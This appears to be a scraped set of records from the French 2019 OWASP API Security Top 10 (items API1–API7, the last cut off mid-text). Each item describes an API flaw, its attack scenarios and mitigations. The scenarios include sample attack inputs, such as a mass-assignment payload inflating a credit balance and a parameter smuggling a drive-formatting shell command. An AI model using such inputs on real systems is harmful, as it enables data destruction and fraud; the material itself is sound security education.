{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **3** : Détectabilité **2** | Technique **3** : Spécifique à l'organisation |\n| Des attaquants peuvent exploiter des points d'accès d'API qui sont vulnérables à la faille de niveau d'autorisation en manipulant l'ID d'un objet qui est envoyé avec la requête. Ceci peut entrainer à un accès non autorisé à des données sensibles. Ce problème est extrêmement commun dans les applications basées sur des API parce que le composant serveur ne suit pas complètement l'état du client, et au lieu de cela, s'appuie davantage sur des paramètres comme les ID objets, qui sont envoyés par le client, pour déterminer à quel objet accéder. | Cette attaque est la plus courante et la plus impactante sur les APIs. Les mécanismes d'autorisation et de contrôle d'accès des applications modernes sont complexes et étendus. Même si l'application implémente une infrastructure adaptée pour les contrôles d'autorisations, les développeurs peuvent oublier d'utiliser ces contrôles avant d'autoriser l'accès à un objet sensible. La détection de contrôles d'accès ne se prête typiquement pas à des tests statiques ou dynamiques automatisés. | Un accès non autorisé peut aboutir à la diffusion de données à des tiers non autorisés, des pertes de données, ou des manipulations de données. Un accès non autorisé aux objets peut aussi aboutir à une prise de contrôle complète d'un compte. |\n\n## L'API est-elle vulnérable ?\n\nL'autorisation au niveau de l'objet est un mécanisme de contrôle d'accès qui est généralement implémenté au niveau du code pour valider qu'un utilisateur puisse uniquement accéder aux objets auxquels il doit avoir accès.\n\nChaque point d'accès d'API qui reçoit l'ID d'un objet, et effectue une action quelconque sur l' objet, doit implémenter des contrôles d'accès au niveau de l'objet. Les contrôles doivent valider que l'utilisateur connecté dispose de l'accès pour effectuer l'action requise sur l'objet requis.\n\nDes vulnérabilités de ce mécanisme entraînent typiquement des diffusions non autorisées d'information, la modification ou la destruction de toutes les données.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nUne plateforme de commerce électronique pour des magasins en ligne (boutiques) comporte une page listant les diagrammes de vente pour les boutiques hébergées. Examinant les requêtes du navigateur, un attaquant peut identifier les points d'accès de l'API utilisés comme sources de données pour ces diagrammes et leur schéma `/shops/{shopName}/revenue_data.json`. Utilisant un autre point d'accès de l'API, l'attaquant peut obtenir la liste de tous les noms des boutiques hébergées. Avec un simple script pour manipuler les noms de la liste, remplaçant `{shopName}` dans l'URL, l'attaquant obtient l'accès aux données de vente de milliers de boutiques de commerce électronique.\n\n### Scénario #2\n\nObservant le trafic réseau d'un appareil de poche, la requête HTTP `PATCH` suivante attire l'attention d'un attaquant du fait de la présence d'un en-tête HTTP personnalisé `X-User-Id: 54796`. Remplaçant  la valeur `X-User-Id` par `54795`, l'attaquant obtient une réponse HTTP valide, et est en mesure de modifier les données des autres comptes utilisateurs.\n\n## Comment s'en prémunir\n\n* Implémentez un véritable mécanisme d'autorisation qui s'appuie sur des droits\n  utilisateurs et sur une hiérarchie.\n* Utilisez un mécanisme d'autorisation pour vérifier si l'utilisateur connecté est\n  autorisé à effectuer l'action requise sur l'enregistrement pour toute fonction\n  qui utilise une entrée du client pour accéder à un enregistrement dans la base\n  de données.\n* Préférez l'utilisation de valeurs aléatoires et non prévisibles comme GUIDs pour\n  les ID des enregistrements.\n* Écrivez des tests pour évaluer les mécanismes d'autorisation. Ne déployez pas des\n  modifications vulnérables qui ne passent pas les tests.\n\n## Références\n\n### Externes\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:33.098608"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **2** : Détectabilité **2** | Technique **3** : Spécifique à l'organisation |\n| L'authentification dans les API est un mécanisme complexe et source de confusions. Les ingénieurs logiciel et en sécurité peuvent avoir une vision faussée sur les limites que peut avoir un shéma d'authentification et la manière de l'implanter correctement. De plus, le mécanisme d'authentification est une cible facile pour les attaquants, dans la mesure où elle est accessible à tous. Ces deux points rendent le composant d'authentification potentiellement vulnérable à de nombreuses exploitations. | On distingue deux sous-problèmes : 1. Manque de mécanismes de protection : les points d'accès d'API responsables de l'authentification doivent être traités différemment des autres points d'accès et doivent implémenter des niveaux de protection supplémentaires 2. Mauvaise implémentation du mécanisme : Le mécanisme est utilisé / implémenté sans prendre en considération les vecteurs d'attaque, ou n'est pas utilisé à bon escient (ex. un mécanisme d'authentification conçu pour des clients IoT n'est probablement pas le bon choix pour des applications web). | Des attaquants peuvent prendre le contrôle des comptes d'autres utilisateurs dans le système, lire leurs données personnelles, et effectuer des actions sensibles à leur place, comme des transactions financières ou l'envoi de messages personnels. |\n\n## L'API est-elle vulnérable ?\n\nLes points d'accès et les flux d'authentification sont des ressources qui doivent être protégées. “Mot de passe oublié / changement de mot de passe” doivent être traités de la même manière que les mécanismes d'authentification.\n\nUne API est vulnérable si elle :\n* Permet le [bourrage d'identifiants][1] quand l'attaquant dispose d'une liste de noms\n  d'utilisateurs et de mots de passe.\n* Permet à des attaquants d'effectuer une attaque par force brute sur le même compte\n  utilisateur, sans présenter de captcha ou de mécanisme de blocage.\n* Permet des mots de passe faibles.\n* Envoie des éléments d'authentification sensibles, tels que des tokens\n  d'authentification ou des mots de passe dans l'URL.\n* Ne valide pas l'authenticité des tokens.\n* Accepte des tokens JWT non signés / faiblement signés (`\"alg\":\"none\"`) / ne\n  valide pas leur date d'expiration.\n* Utilise des mots de passe en clair, non chiffrés ou faiblement hashés.\n* Utilise des clés de chiffrement faibles.\n\n## Exemples de scénarios d'attaque\n\n## Scenario #1\n\nLe [bourrage d'identifiants][1] (utilisant des [listes de noms d'utilisateurs / mots de passe connus][2]), est une attaque courante. Si une application n'implémente pas de protections automatisées contre les menaces ou le bourrage d'identifiants, l'application peut être utilisée comme oracle à mots de passe (testeur) pour déterminer si les identifiants sont valides.\n\n## Scenario #2\n\nUn attaquant commence le processus de récupération de mot de passe en émettant une requête POST vers `/api/system/verification-codes` comportant le nom d'utilisateur dans le corps de la requête. Ensuite un token à 6 chiffres est envoyé par SMS sur le téléphone de la victime. Comme l'API n'implémente pas de mécanisme limitant les requêtes, l'attaquant peut tester toutes les combinaisons possibles en utilisant un script multi-threadé contre le point d'accès `/api/system/verification-codes/{smsToken}` pour découvrir le bon token en l'espace de quelques minutes.\n\n## Comment s'en prémunir\n\n* Assurez-vous de connaitre tous les flux possibles pour s'identifier auprès de\n  l'API (mobile / web / liens profonds qui implémentent l'authentification en un\n  clic / etc.)\n* Demandez à vos ingénieurs quels flux vous avez oubliés.\n* Documentez-vous sur vos mécanismes d'authentification. Assurez-vous de comprendre\n  ce qui est utilisé et comment. OAuth n'est pas une authentification, les clés\n  d'API non plus.\n* Ne réinventez pas la roue en matière d'authentification, de génération de tokens,\n  de stockage de mots de passe. Utilisez les standards.\n* Les points d'accès de récupération / d'oubli de mot de passe doivent être traités\n  comme des points d'accès de login en termes de force brute, limitation de requêtes\n  et de protection par blocage.\n* Utilisez la [cheatsheet OWASP Authentication ][3].\n* Quand c'est possible, implémentez l'authentification multi-facteurs.\n* Implémentez des mécanismes anti force brute pour empêcher le bourrage\n  d'identifiants, les attaques par dictionnaire, et les attaques par force brute\n  contre vos points d'accès d'authentification. Ce mécanisme devrait être plus strict\n  que le mécanisme de limitation de requêtes normal de votre API.\n* Implémentez [le blocage de compte][4] / un mécanisme de captcha pour empêcher\n  l'emploi de force brute contre des utilisateurs spécifiques. Implementez des\n  mesures pour une meilleure robustesse des mots de passe.\n* Les clés d'API ne doivent pas être utilisées pour authentifier un utilisateur,\n  mais pour les [applications clientes / authentification de projets][5].\n\n## Références\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Externes\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:33.215562"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **2** : Détectabilité **2** | Technique **2** : Spécifique à l'organisation |\n| L'exploitation d'exposition excessive de données est simple, et est généralement effectuée en écoutant le trafic pour analyser les réponses de l'API, à la recherche de données sensibles qui ne devraient pas être retournées à l'utilisateur. | Les API comptent sur les clients pour effectuer le filtrage des données. Comme les API sont utilisées comme sources de données, les développeurs les implémentent parfois de manière générique sans penser au caractère sensible des données diffusées. En général les outils automatiques ne permettent pas de détecter ce type de vulnérabilité car il est difficile de faire la différence entre les données légitimement retournées par l'API, et des données sensibles qui ne devraient pas être retournées sans une compréhension en profondeur de l'application. | L'exposition excessive de données conduit généralement à la diffusion de données sensibles. |\n\n## L'API est-elle vulnérable ?\n\nPar conception, l'API retourne des données sensibles au client. De plus, ces données sont généralement filtrées côté client avant d'être présentées à l'utilisateur. Un attaquant peut facilement écouter le trafic et voir les données sensibles.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nL'équipe mobile utilise le point d'accès `/api/articles/{articleId}/comments/{commentId}`\ndans la vue des articles pour le rendu des métadonnées des commentaires. Ecoutant le trafic de l'application mobile, un attaquant découvre que d'autres données sensibles relatives à l'auteur du commentaire sont également retournées. L'implémentation du point d'accès utilise une méthode générique `toJSON()` sur le modèle `User`, qui contient des données personnelles, pour sérialiser l'objet.\n\n### Scénario #2\n\nUn système de surveillance à base d'IoT permet aux administrateurs de créer des utilisateurs avec différentes permissions. Un administrateur a créé un compte utilisateur pour un nouvel agent de sécurité qui ne devrait avoir accès qu'à certains bâtiments spécifiques sur le site. Quand l'agent de sécurité utilise son appli mobile, un appel d'API est effectué vers `/api/sites/111/cameras` pour recevoir des données à propos des caméras disponibles et les montrer sur un tableau de bord. La réponse contient une liste avec des informations sur les caméras au format suivant : `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`.\nSi l'interface graphique du client montre uniquement les caméras auxquelles l'agent de sécurité doit avoir accès, la réponse de l'API contient en réalité la liste complète de toutes les caméras présentes sur le site.\n\n## Comment s'en prémunir\n\n* Ne comptez jamais sur le client d'API pour filtrer des données sensibles.\n* Passez en revue les réponses de l'API pour vous assurer qu'elles contiennent\n  uniquement des données nécessaires.\n* Les ingénieurs backend devraient toujours se poser la question \"qui est le\n  consommateur des données ?\" avant d'exposer un nouveau point d'accès d'API.\n* Évitez les méthodes génériques telles que `to_json()` ou `to_string()`.\n  Au lieu de cela, choisissez les éléments précis que vous voulez vraiment retourner.\n* Classifiez les données sensibles et personnelles que votre application stocke et\n  manipule, et passez en revue tous les appels d'API qui retournent de telles\n  données pour voir si les réponses posent des problèmes de sécurité.\n* Implémentez un mécanisme de réponse basé sur un schéma de validation afin d'ajouter un niveau de sécurité\n  supplémentaire. Au sein de ce mécanisme définissez et validez les données retournées\n  par toutes les méthodes d'API, erreurs comprises.\n\n\n## Références\n\n### Externes\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:33.330487"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **2** | Prévalence **3** : Détectabilité **3** | Technique **2** : Spécifique à l'organisation |\n| L'exploitation consiste en de simples requêtes d'API. Aucune authentification n'est requise. Des requêtes multiples concurrentes peuvent être effectuées depuis un unique ordinateur local ou en utilisant des ressources d'informatique en nuage. | Il est fréquent de trouver des API qui n'implémentent pas de limitations des requêtes ou dont les limitations ne sont pas correctement paramétrées. | L'exploitation peut aboutir à un déni de service, rendant l'API incapable de répondre ou même indisponible. |\n\n## L'API est-elle vulnérable ?\n\nLes requêtes d'API consomment des ressources réseau, processeur, mémoire et de stockage. La quantité de ressources requises pour satisfaire à une requête dépendent grandement des données entrées par l'utilisateur et de la logique métier du point d'accès. De plus, il faut considérer le fait que les requêtes de différents clients de l'API sont en concurrence pour l'utilisation des ressources. Une API est vulnérable si au moins une des limites suivantes est manquante ou incorrectement paramétrée (c'est-à-dire trop basse / trop élevée) :\n\n* durée maximale d'exécution\n* Maximum de mémoire allouable\n* Nombre de descripteurs de fichiers\n* Nombre de processus\n* Taille de la charge utile de la requête (ex. téléversement)\n* Nombre de requêtes par client / ressource\n* Nombre d'enregistrements par page à retourner pour chaque réponse individuelle\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nUn attaquant téléverse une grande image en émettant une requête POST vers `/api/v1/images`.\nLorsque le téléversement est terminé, l'API crée plusieurs vignettes avec différentes tailles. Du fait de la taille de l'image téléversée, la mémoire disponible est saturée par la création des vignettes et l'API ne répond plus.\n\n### Scénario #2\n\nNous avons une application qui contient la liste des utilisateurs avec une limite de `200` utilisateurs par page. La liste des utilisateurs est obtenue auprès du serveur avec la requête suivante : `/api/users?page=1&size=200`. Un attaquant change la valeur de `size`\nen `200 000`, entrainant des problèmes de perfomance sur la base de données. De ce fait, l'API ne répond plus et n'est plus capable de traiter d'autres requêtes de ce client ou d'autres clients (autrement dit déni de service).\n\nLe même scénario peut être utilisé pour générer des erreurs Integer Overflow ou Buffer Overflow.\n\n## Comment s'en prémunir\n\n* Docker permet facilement de limiter [la mémoire][1], [le processeur][2], [le nombre de redémarrages][3],\n  [les descripteurs de fichiers et les processus][4].\n* Implémentez une limite du nombre d'appels à l'API qu'un client peut effectuer\n  sur une période donnée.\n* Notifiez le client quand la limite est dépassée en indiquant la limite et quand\n  cette limite sera remise à zéro.\n* Ajoutez des validations adaptées côté serveur pour les paramètres fournis en\n  ou fournis en corps de requête, en particulier ceux qui contrôlent le nombre\n  d'enregistrements à retourner dans la réponse.\n* Définissez et appliquez une taille maximale pour les données entrées en paramètres\n et les charges utiles, comme des longueurs maximales pour les chaines de\n  caractères et un nombre maximal d'éléments dans les tableaux.\n\n\n## Références\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Externes\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:33.443312"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **2** : Détectabilité **1** | Technique **2** : Spécifique à l'organisation |\n| L'exploitation requiert que l'attaquant envoie des appels d'API légitimes vers un point d'accès d'API auquel il ne devrait pas avoir accès. Ces points d'accès peuvent être exposés à des utilisateurs anonymes ou à des utilisateurs normaux dépourvus de privilèges. Il est plus facile de découvrir ces failles dans les API car les API sont plus structurées, et le mode d'accès à certaines fonctions est plus prévisible (ex : remplacer la méthode HTTP GET par PUT, ou changer la chaine \"users\" de la requête en \"admins\". | Les contrôles d'autorisation pour une fonction ou une ressource sont généralement gérés via la configuration, et parfois au niveau du code. L'implémentation de contrôles appropriés peut être source de confusion, car les applications modernes peuvent contenir de nombreux types de rôles ou de groupes et une hiérarchie des utilisateurs complexe (ex : sous-utilisateurs, utilisateurs avec plusieurs rôles). | Ces failles permettent aux attaquants d'accéder à des fonctionnalités non autorisées. Les tâches administratives constituent des cibles principales pour ce type d'attaque. |\n\n## L'API est-elle vulnérable ?\n\nLa meilleure manière de trouver des problèmes de niveaux d'accès aux fonctionnalités consiste à effectuer une analyse approfondie du mécanisme d'autorisation, tout en gardant à l'esprit la hiérarchie des utilisateurs, les différents rôles ou groupes dans l'application, et à poser les questions suivantes :\n\n* Un utilisateur normal peut-il accéder à des points d'accès d'administration ?\n* Un utilisateur peut-il effectuer des actions sensibles (ex : création,\n  modification ou suppression) auxquelles il ne devrait pas avoir accès en\n  changeant simplement la méthode HTTP (ex : de `GET` à `DELETE`) ?\n* Un utilisateur du groupe X peut-il accéder à une fonction qui ne devrait être\n  accessible qu'aux utilisateurs du groupe Y, simplement en devinant l'URL du\n  point d'accès et les paramètres (ex : `/api/v1/users/export_all`) ?\n\nNe supposez pas qu'un point d'accès d'API est normal ou administrateur\nuniquement sur la base du chemin de l'URL.\n\nSi les développeurs peuvent choisir d'exposer la plupart des points d'accès\nd'administration sous un chemin relatif spécifique, comme `api/admins`, on\ntrouve très fréquemment ces points d'accès administrateur sous d'autres chemins\nrelatifs mélés aux points d'accès normaux, comme `api/users`.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nAu cours du processus d'enregistrement à une application qui permet uniquement\naux utilisateurs invités de s'inscrire, l'application mobile effectue un appel\nd'API à `GET /api/invites/{invite_guid}`. La réponse contient un JSON avec des\ninformations sur l'invitation, parmi lesquelles le rôle de l'utilisateur et son\ne-mail.\n\nUn attaquant a dupliqué la requête et manipulé la méthode HTTP et le point\nd'accès vers `POST /api/invites/new`. Ce point d'accès devrait être accessible\nuniquement aux administrateurs via la console d'administration, qui\nn'implémente pas de contrôles de niveaux d'accès aux fonctionnalités.\n\nL'attaquant exploite cette faille et s'envoie à lui-même une invitation pour se\ncréer un compte administrateur :\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Scénario #2\n\nUne API comporte un point d'accès qui devrait uniquement être accessible aux\nadministrateurs : `GET /api/admin/v1/users/all`. Ce point d'accès renvoie les\ninformations sur tous les utilisateurs de l'application et n'implémente pas de\ncontrôles d'autorisations d'accès. Un attaquant ayant appris la\nstructure de l'API effectue une déduction logique et réussit à accéder à ce\npoint d'accès, qui expose des données sensibles sur les utilisateurs de\nl'application..\n\n## Comment s'en prémunir\n\nVotre application devrait disposer d'un module d'autorisations constant et\nfacile à analyser qui est invoqué par toutes vos fonctions métiers.\nFréquemment, cette protection est fournie par un ou plusieurs composants\nexternes au code de l'application.\n\n* Le(s) mécanisme(s) de contrôle devraient interdire tous les accès par défaut,\n  et requérir des privilèges explicites à des rôles spécifiques pour l'accès à\n  toutes les fonctions.\n* Passez en revue vos points d'accès d'API à la recherche des défauts d'autorisations\n  niveau des fonctions, en gardant à l'esprit la logique applicative et la\n  hiérarchie des groupes.\n* Assurez-vous que tous vos contrôleurs d'administration héritent d'un\n  contrôleur d'administration abstrait qui implémente des contrôles\n  d'autorisation basés sur le groupe / rôle de l'utilisateur.\n* Assurez-vous que les fonctions d'administration à l'intérieur d'un contrôleur\n  normal implémentent des contrôles d'autorisation basés sur le groupe / rôle\n  de l'utilisateur.\n\n## Références\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Externes\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:33.566103"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **2** | Prévalence **2** : Détectabilité **2** | Technique **2** : Spécifique à l'organisation |\n| L'exploitation requiert généralement une compréhension de la logique métier, des relations entre objets, et de la structure de l'API. L'exploitation de l'assignation massive est plus facile dans les API, car par conception elles exposent l'implémentation sous-jacente de l'application ainsi que les noms des attributs. | Les frameworks modernes encouragent les développeurs à utiliser des fonctions qui lient automatiquement les entrées du client aux variables du code et aux objets internes. Des attaquants peuvent utiliser cette méthodologie pour modifier ou écraser des attributs d'objets sensibles que les développeurs n'avaient jamais eu l'intention d'exposer. | L'exploitation peut conduire à l'élévation des privilèges, la falsification des données, au contournement de mécanismes de sécurité, et plus encore. |\n\n## L'API est-elle vulnérable ?\n\nLes objets des applications modernes peuvent posséder de nombreux attributs.\nCertains de ces attributs doivent pouvoir être actualisés par le client (ex :\n`user.first_name` ou `user.address`) et d'autres ne doivent pas pouvoir l'être\n(ex : drapeau `user.is_vip`).\n\nUn point d'accès d'API est vulnérable s'il convertit automatiquement des\nparamètres client en attributs objet internes, sans prendre en compte la\nsensibilité et le niveau d'exposition de ces attributs. Ceci pourrait\npermettre à un attaquant d'actualiser des attributs d'objets auxquels il ne\ndevrait pas avoir accès.\n\nExemples d'informations sensibles :\n\n* **Attributs liés à des permissions** : `user.is_admin`, `user.is_vip` doivent\n  être définis uniquement par des administrateurs.\n* **Attributs dépendant de processus** : `user.cash` ne doit être défini au  \n  niveau interne qu'après vérification du paiement.\n* **Attributs internes** : `article.created_time` doit être\n  défini uniquement par l'application.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nUne application de covoiturage permet à l'utilisateur de modifier les\ninformations de base de son profil. Au cours de ce processus, un appel d'API\nest envoyé à `PUT /api/v1/users/me` avec l'objet JSON légitime suivant :\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nLa requête `GET /api/v1/users/me` comporte un attribut supplémentaire sur le\nsolde du compte :\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nL'attaquant rejoue la première requête avec la charge utile suivante :\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nLe point d'accès étant vulnérable à l'assignation massive, l'attaquant dispose\ndu crédit sans avoir payé.\n\n### Scénario #2\n\nUn portail de partage de vidéos permet aux utilisateurs de téléverser et de\ntélécharger du contenu dans différents formats. Un attaquant qui explore l'API\ndécouvre que le point d'accès `GET /api/v1/videos/{video_id}/meta_data`\nretourne un objet JSON avec les attributs de la vidéo. L'un des attributs est `\"mp4_conversion_params\":\"-v codec h264\"`, qui indique que l'application\nutilise une commande shell pour convertir la vidéo.\n\nL'attaquant a également découvert que le point d'accès\n`POST /api/v1/videos/new` est vulnérable à l'assignation massive et permet au\nclient de définir n'importe quel attribut de l'objet vidéo. L'attaquant définit\nune valeur malveillante de la manière suivante :\n`\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Cette valeur va\nentrainer une injection de commande shell quand l'attaquant chargera la vidéo\nau format MP4.\n\n## Comment s'en prémunir\n\n* Si possible, évitez d'utiliser des fonctions qui lient automatiquement une\n  saisie client à des variables du code ou des objets internes.\n* Autorisez uniquement les attributs qui doivent pouvoir être actualisés par le\n  client.\n* Utilisez les fonctionnalités natives pour interdire les attributs qui ne\n  doivent pas être accessibles aux clients.\n* Si applicable, définissez et imposez des schémas pour la validation des\n  données d'entrée de la charge utile .\n\n## Références\n\n### Externes\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:33.686319"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **3** : Détectabilité **3** | Technique **2** : Spécifique à l'organisation |\n| Les attaquants essaieront souvent de trouver des failles non corrigées, des points d'accès courants, ou des fichiers et des répertoires non protégés pour obtenir un accès non autorisé ou des informations sur le système. | Des erreurs de configuration de sécurité peuvent se produire à toutes les couches de l'API, depuis la couche réseau jusqu'à la couche applicative. Il existe des outils automatisés pour détecter et exploiter des erreurs de configuration telles que des services non nécessaires ou d'anciennes options. | Les erreurs de configuration de sécurité peuvent non seulement exposer des données utilisateur confidentielles, mais aussi des informations système qui peuvent aboutir à une compromission complète du serveur. |\n\n## L'API est-elle vulnérable ?\n\nL'API peut être vulnérable si :\n\n* Un durcissement approprié de la sécurité est manquant sur n'importe quelle\n  partie de la pile applicative, ou si elle possède des permissions mal\n  configurées au niveau de services cloud.\n* Les dernières mises à jour de sécurité ne sont pas appliquées, ou les\n  systèmes sont obsolètes.\n* Des fonctionnalités non nécessaires sont déployées (ex : verbes HTTP).\n* La sécurité de la couche de transport (TLS) est manquante.\n* Les instructions d'en-têtes sécurisées ne sont pas envoyées au client \n  (e.g., [Security Headers][1]).\n* La politique de partage de ressources entre origines multiples (CORS) est\n  manquante ou mal définie.\n* Les messages d'erreurs incluent des traces de pile d'exécution, ou exposent\n  d'autres informations sensibles.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nUn attaquant trouve le fichier `.bash_history` dans le répertoire racine du\nserveur, qui contient les commandes utilisées par l'équipe DevOps pour accéder\nà l'API :\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nUn attaquant pourrait aussi découvrir de nouveaux points d'accès de l'API qui\nsont uniquement utilisés par l'équipe DevOps et qui ne sont pas documentés.\n\n### Scénario #2\n\nPour cibler un service spécifique, un attaquant utilise un moteur de recherche\npopulaire pour chercher les ordinateurs directement accessibles depuis\nl'internet. L'attaquant trouve un hôte faisant tourner un système populaire de\ngestion de bases de données, qui écoute sur le port par défaut. L'hôte\nutilisait la configuration par défaut, dans laquelle l'authentification est\ndésactivée par défaut, et l'attaquant a obtenu accès à des millions\nd'enregistrements contenant des données personnelles, des préférences\npersonnelles, et des données d'authentification.\n\n### Scénario #3\n\nEn inspectant le trafic d'une application mobile un attaquant découvre que tout\nle trafic n'est pas effectué avec un protocole sécurisé (ex : TLS). L'attaquant\nle constate en particulier pour le téléchargement des images de profil. Comme\nl'interaction est binaire, malgré le fait que le trafic API est effectué sur un\nprotocole sécurisé, l'attaquant remarque un schéma au niveau de la taille des\nréponses de l'API, qu'il utilise pour pister les préférences utilisateur à\npartir du contenu rendu (ex : images de profil).\n\n## Comment s'en prémunir\n\nLe cycle de vie de l'API devrait inclure :\n\n* Un processus de durcissement permettant le déploiement rapide et facile d'un\n  environnement correctement verrouillé.\n* Une tâche pour évaluer et actualiser les configurations sur l'ensemble des\n  couches de l'API. L'évaluation devrait couvrir : les fichiers\n  d'orchestration, les composants d'API, et les services cloud\n  (ex : permissions des compartiments de stockage S3).\n* Un canal de communication sécurisé pour tous les accès API d'interaction\n  avec les éléments statiques (ex : images).\n* Un processus automatisé pour évaluer en continu l'efficacité de la\n  configuration et des réglages dans tous les environnements.\n\nDe plus :\n\n* Pour éviter que des traces d'appels lors d'exceptions et d'autres informations importantes\n  ne soient renvoyées aux 